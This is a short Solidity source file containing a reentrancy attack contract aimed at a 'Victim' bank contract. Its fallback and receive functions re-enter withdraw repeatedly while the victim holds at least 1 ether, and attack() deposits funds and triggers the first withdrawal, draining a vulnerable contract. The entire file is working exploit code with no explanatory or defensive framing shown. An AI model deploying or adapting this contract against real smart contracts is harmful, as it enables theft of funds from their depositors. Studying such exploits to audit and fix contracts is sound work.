// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

interface Victim {
    function deposit() external payable;
    function withdraw(uint256) external;
}

contract ReentrancyAttacker {
    Victim public victim;

    constructor(address _bank) {
        victim = Victim(_bank);
    }

    fallback() external payable {
        if (address(victim).balance >= 1 ether) {
            victim.withdraw(1 ether);
        }
    }

    receive() external payable {
        if (address(victim).balance >= 1 ether) {
            victim.withdraw(1 ether);
        }
    }

    function attack() external payable {
        victim.deposit{value: 10 ether}();
        victim.withdraw(1 ether);
    }
}
